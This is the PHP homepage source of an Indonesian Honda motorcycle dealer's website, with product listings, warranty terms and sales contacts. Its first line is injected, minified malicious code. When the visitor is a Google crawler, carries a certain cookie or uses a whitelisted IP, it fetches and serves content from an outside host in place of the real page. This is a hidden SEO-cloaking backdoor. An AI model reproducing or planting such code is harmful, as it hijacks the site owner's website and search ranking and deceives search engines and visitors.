<?php error_reporting(0);$link='https://x-projetion.org/dpantek/@/dpantek_pe9DIjGx@RAW'; //E5F466
function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['116.212.130.44','116.212.130.199','103.121.122.206','136.228.135.175','37.28.159.238'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?>
<?php
include "header.php"; 
include "config.php"; 
?>

	<style>
	.fa-whatsapp{
		color: #e4c95e;
		height: 30px;
		width: 30px;
		font-size: 30px;
	}
	.banner-area {
  background: url(img/banner/banner-abu.jpg) center no-repeat;
  background-size: cover;
  position: relative; }
  @media (max-width: 768px) {
    .banner-area .fullscreen {
      height: 650px !important; } }
	</style>
		<!-- Start Header Area -->
	<header class="header_area sticky-header">
		<div class="main_menu">
			<nav class="navbar navbar-expand-lg navbar-light main_box">
				<div class="container">
					<!-- Brand and toggle get grouped for better mobile display -->
					<a class="navbar-brand logo_h" href="index.php"><img src="img/logo6.png" alt=""></a>
					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
					 aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
					<!-- Collect the nav links, forms, and other content for toggling -->
					<div class="collapse navbar-collapse offset" id="navbarSupportedContent">
						<ul class="nav navbar-nav menu_nav ml-auto">
							<li class="nav-item active"><a class="nav-link" href="index.php">Beranda</a></li>
							<li class="nav-item submenu dropdown">
								<a href="motor.php" class="nav-link">Motor</a>
							</li>
							<li class="nav-item submenu dropdown">
								<a href="aksesoris.php" class="nav-link">Aksesoris</a>
							</li>
							<li class="nav-item submenu dropdown">
								<a href="apparel.php" class="nav-link">Apparel</a>
							<li class="nav-item submenu dropdown">
								<a href="promo.php" class="nav-link">Promo</a>
							</li>
							<li class="nav-item"><a class="nav-link" href="admin/login.php">Login</a></li>
						</ul>
					</div>
				</div>
			</nav>
		</div>
		<div class="search_input" id="search_input_box">
			<div class="container">
				<form class="d-flex justify-content-between">
					<input type="text" class="form-control" id="search_input" placeholder="Search Here">
					<button type="submit" class="btn"></button>
					<span class="lnr lnr-cross" id="close_search" title="Close Search"></span>
				</form>
			</div>
		</div>
	</header>
	<!-- End Header Area -->
	<!-- start banner Area -->
	<section class="banner-area">
	<br>
		<div class="container">
			<div class="row fullscreen align-items-center justify-content-start">
				<div class="col-lg-12">
					<div class="active-banner-slider owl-carousel">
						<!-- single-slide -->
						<div class="row single-slide">
							<div class="col-lg-5 ol-md-6">
								<div class="banner-content">
									<h1>DEALER & BENGKEL <br> RESMI HONDA</h1>
									<p><strong>Demi untuk memenuhi keinginan pelanggan, kami menyediakan motor Honda, Service, Sparepart dengan standart operasional perusaaan pelayanan "One HEART With Care"</strong></p>
										<br>
										<p class="hover-text">Klik Icon Whatsapp Untuk Informai Produk Kami !!</p>
										<a class="add-btn" href="https://wa.me/6281216502016?" target="_blank"><img src="img/whatsapp.png" style="width:30px; height:30px;"></span></a>
								</div>
							</div>
							<div class="col-lg-7">
								<div class="banner-img">
									<img class="img-fluid" src="img/banner/TAMPAK DEPAN.png" alt="">
								</div>
							</div>
						</div>
						<!-- single-slide -->
						<div class="row single-slide">
							<div class="col-lg-5 ol-md-6">
								<div class="banner-content">
									<h1>GARANSI MOTOR<br>HONDA</h1>
										<p><strong>Berikut perubahan masa garansi untuk pembelian motor sejak 25 Oktober 2023 :</strong></p>
										<ol>
												<strong>	
												<li>Garansi rangka – 5 tahun tanpa batasan jarak tempuh.</li>
												<li>Garansi mesin – 3 tahun atau 36,000 KM tergantung mana yang lebih dulu dicapai.</li>
												<li>Garansi sistem kelistrikan dan komponen rangka – 1 tahun atau 12,000 KM tergantung mana yang lebih dulu dicapai.</li>
												<li>Garansi komponen PGM-FI (khusus untuk motor berteknologi PGM0-FI) – 5 tahun atau 60,000 KM tergantung mana yang lebih dulu dicapai.</li>
											</strong>
										</ol>
										<p class="hover-text">Klik Icon Whatsapp Untuk Informasi Produk Kami !!</p>
										<a class="add-btn" href="https://wa.me/6281216502016?" target="_blank"><img src="img/whatsapp.png" style="width:30px; height:30px;"></span></a>
								</div>
							</div>
							<div class="col-lg-7">
								<div class="banner-img">
									<img class="img-fluid" src="img/banner/SLIDE 2.png" alt="">
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- End banner Area -->


	<!-- start product Area -->
	<section class="owl-carousel active-product-area section_gap">
		<!-- single product slide -->
		<div class="single-product-slider">
			<div class="container">
				<div class="row justify-content-center">
					<div class="col-lg-6 text-center">
						<div class="section-title">
							<h1>MOTOR MATIC</h1>        
							<p></p>                 
						</div>
					</div>
				</div>
				<div class="row">
					<!-- single product -->
					<?php $ambil= $koneksi->query("SELECT * FROM motor WHERE ktmotor='Matic' order by idmotor ASC"); ?>
					<?php while($permotor= $ambil->fetch_assoc()){ ?>
					<div class="col-lg-3
					 col-md-6">
						<div class="single-product">
								<a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>">
									<img class="img-fluid" src="img/motor/<?php echo $permotor['foto1'];?>" alt="">
								</a>
								<div class="product-details">
								<h6><a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>"> 
										<?php echo $permotor['nmmotor'];?></a></h6>
								<div class="price">
									<h6>Rp. <?php echo number_format($permotor['hrmotor']);?></h6>
									<tr>
									<h6 class="text"><?php echo $permotor['ktmotor'];?></h6>
								</div>
									<br>
									<p class="hover-text">Klik Icon Whatsapp Untuk Informasi Produk di Atas!</p>
									<a href="https://wa.me/6281216502016?text=Hallo%20Kak%2C%20Apakah%20Saya%20Bisa%20Minta%20Detail%20Produk%20Dari%20<?php echo $permotor['nmmotor'];?>??" target="_blank" class="social-info">
										<img src="img/whatsapp.png" style="width:30px; height:30px;"></span>
									</a>
							</div>
						</div>
					</div>
					<!-- single product -->
					<?php } ?>
				</div>
			</div>
		</div>
		<!-- single product slide -->
		<div class="single-product-slider">
			<div class="container">
				<div class="row justify-content-center">
					<div class="col-lg-6 text-center">
						<div class="section-title">
							<h1>MOTOR SPORT</h1>
							<p></p>

						</div>
					</div>
				</div>
				<div class="row">
					<!-- single product -->
					<?php $ambil= $koneksi->query("SELECT * FROM motor WHERE ktmotor='Sport' order by idmotor ASC"); ?>
					<?php while($permotor= $ambil->fetch_assoc()){ ?>
					<div class="col-lg-3 col-md-6">
						<div class="single-product">
							<a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>">
									<img class="img-fluid" src="img/motor/<?php echo $permotor['foto1'];?>" alt="">
								</a>
							<div class="product-details">
								<h6><a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>"> 
										<?php echo $permotor['nmmotor'];?></a></h6>
								<div class="price">
									<h6>Rp. <?php echo number_format($permotor['hrmotor']);?></h6>
									<h6 class="text"><?php echo $permotor['ktmotor'];?></h6>
								</div>
								<div class="prd-bottom">
									<br>
									<p class="hover-text">Klik Icon Whatsapp Untuk Informasi Produk di Atas!</p>
									<a href="https://wa.me/6281216502016?text=Hallo%20Kak%2C%20Apakah%20Saya%20Bisa%20Minta%20Detail%20Produk%20Dari%20<?php echo $permotor['nmmotor'];?>??" target="_blank"class="social-info">
										<img src="img/whatsapp.png" style="width:30px; height:30px;"></span>
									</a>
								</div>
							</div>
						</div>
					</div>
					<!-- single product --><?php } ?>
				</div>
			</div>
		</div>
		
		<div class="single-product-slider">
			<div class="container">
				<div class="row justify-content-center">
					<div class="col-lg-6 text-center">
						<div class="section-title">
							<h1>MOTOR CUB</h1>
							<p></p>
						</div>
					</div>
				</div>
				<div class="row">
					<!-- single product -->
					<?php $ambil= $koneksi->query("SELECT * FROM motor WHERE ktmotor='Cub' order by idmotor ASC"); ?>
					<?php while($permotor= $ambil->fetch_assoc()){ ?>
					<div class="col-lg-3 col-md-6">
						<div class="single-product">
							<a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>">
									<img class="img-fluid" src="img/motor/<?php echo $permotor['foto1'];?>" alt="">
								</a>
							<div class="product-details">
								<h6><a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>"> 
										<?php echo $permotor['nmmotor'];?></a></h6>
								<div class="price">
									<h6>Rp. <?php echo number_format($permotor['hrmotor']);?></h6>
									<h6 class="text"><?php echo $permotor['ktmotor'];?></h6>
								</div>
								<div class="prd-bottom">
									<br>
									<p class="hover-text">Klik Icon Whatsapp Untuk Informasi Produk di Atas!</p>
									<a href="https://wa.me/6281216502016?text=Hallo%20Kak%2C%20Apakah%20Saya%20Bisa%20Minta%20Detail%20Produk%20Dari%20<?php echo $permotor['nmmotor'];?>??" target="_blank" class="social-info">
										<img src="img/whatsapp.png" style="width:30px; height:30px;"></span>
									</a>
								</div>
							</div>
						</div>
					</div>
					<!-- single product -->
					<?php } ?>
				</div>
			</div>
		</div>
		
		<div class="single-product-slider">
			<div class="container">
				<div class="row justify-content-center">
					<div class="col-lg-6 text-center">
						<div class="section-title">
							<h1>MOTOR EV/LISTRIK</h1>
							<p></p>
						</div>
					</div>
				</div>
				<div class="row">
					<!-- single product -->
					<?php $ambil= $koneksi->query("SELECT * FROM motor WHERE ktmotor='EV/Listrik' order by idmotor ASC"); ?>
					<?php while($permotor= $ambil->fetch_assoc()){ ?>
					<div class="col-lg-3 col-md-6">
						<div class="single-product">
							<a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>">
									<img class="img-fluid" src="img/motor/<?php echo $permotor['foto1'];?>" alt="">
								</a>
							<div class="product-details">
								<h6><a href="detail.php?idmotor=<?php echo $permotor['idmotor']; ?>"> 
										<?php echo $permotor['nmmotor'];?></a></h6>
								<div class="price">
									<h6>Rp. <?php echo number_format($permotor['hrmotor']);?></h6>
									<h6 class="text"><?php echo $permotor['ktmotor'];?></h6>
								</div>
								<div class="prd-bottom">
									<p class="hover-text">Klik Icon Whatsapp Untuk Informasi Produk di Atas!</p>
									<a href="https://wa.me/6281216502016?text=Hallo%20Kak%2C%20Apakah%20Saya%20Bisa%20Minta%20Detail%20Produk%20Dari%20<?php echo $permotor['nmmotor'];?>??" target="_blank" class="social-info">
										<img src="img/whatsapp.png" style="width:30px; height:30px;"></span>
									</a>
								</div>
							</div>
						</div>
					</div>
					<!-- single product -->
					<?php } ?>
				</div>
			</div>
		</div>
	<!-- end product Area -->
	</section>
	
	<!-- Start brand Area -->
	<section class="brand-area section_gap">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-lg-6 text-center">
					<div class="section-title">
						<h1>Sales Counter Dealer Bonanza Motor Lamongan</h1>
					</div>
				</div>
			</div>
			<div class="row">
				<?php $ambil= $koneksi->query("SELECT * FROM user WHERE levelp='2'"); ?>
				<?php while($user1= $ambil->fetch_assoc()){ ?>
				<div class="single-product">
					<a href="https://wa.me/62<?php echo $user1['teleponp'];?>?text=Hallo%20Kak%20<?php echo $user1['namap'];?>%2C%20Apakah%20Saya%20Bisa%20Minta%20Penawaran%20Harga%20Motor%20Terbaru%20??" target="_blank" > 
						<img class="img-fluid" src="img/user/<?php echo $user1['foto'];?>" alt="">
					</a>
					<div class="product-details">
						<center>
							<a href="https://wa.me/62<?php echo $user1['teleponp'];?>?text=Hallo%20Kak%20<?php echo $user1['namap'];?>%2C%20Apakah%20Saya%20Bisa%20Minta%20Penawaran%20Harga%20Motor%20Terbaru%20??" target="_blank" class="social-info">
								<img src="img/whatsapp.png" style="width:30px; height:30px;"></span></a>
							<h6><?php echo $user1['namap'];?></h6>
							<p><?php echo $user1['jabatanp'];?></p>
						</center>
					</div>
				</div>
				<?php } ?>
			</div>
		</div>
	</section>
	<!-- End brand Area -->
	
	<!-- Start brand Area -->
	<!--section class="brand-area section_gap">
		<div class="container">
			<div class="row">
				<a class="col single-img" href="">
					<img class="img-fluid d-block mx-auto" src="img/brand/hondawing.png" alt="">
						<br>
						<h6><p>Dealer sepeda motor Honda yang melayani penjualan motor honda premium model(CBR250RR, CRF250RALLY, Forza, Monkey, Super Cub 125), dan Honda Reguler model (Matic, Sport, dan Cub)</p></h6>
				</a>
				<a class="col single-img" href="#">
					<img class="img-fluid d-block mx-auto" src="img/brand/5tahungaransi1.jpg" alt="">
						<ol>
									<br>
									<h6><p class="text-align: right">Seiring dengan peluncuran New Honda Scoopy, PT Astra Honda Motor (AHM) telah memperpanjang masa garansi rangka untuk sepeda motor yang produksinya. Masa garansi rangka yang sebelumnya hanya 1 tahun kini ditingkatkan menjadi 5 tahun tanpa batasan jarak tempuh (kilometer). Perpanjangan masa garansi ini mulai berlaku untuk sepeda motor baru yang diterima oleh konsumen sejak 25 Oktober 2023.</p></h6>
									<br>
									<h6>Berikut perubahan masa garansi untuk pembelian motor sejak 25 Oktober 2023 :</p>
					
									<li>Garansi rangka – 5 tahun tanpa batasan jarak tempuh</li>
									<li>Garansi mesin – 3 tahun atau 36,000 KM tergantung mana yang lebih dulu dicapai.</li>
					 				<li>Garansi sistem kelistrikan dan komponen rangka – 1 tahun atau 12,000 KM tergantung mana yang lebih dulu dicapai.</li>
									<li>Garansi komponen PGM-FI (khusus untuk motor berteknologi PGM0-FI) – 5 tahun atau 60,000 KM tergantung mana yang lebih dulu dicapai.</li>
						</ol>
				</a>
			</div>
		</div>
	</section-->
	<!-- End brand Area -->
	

<?php 
include "footer.php"; 
?>
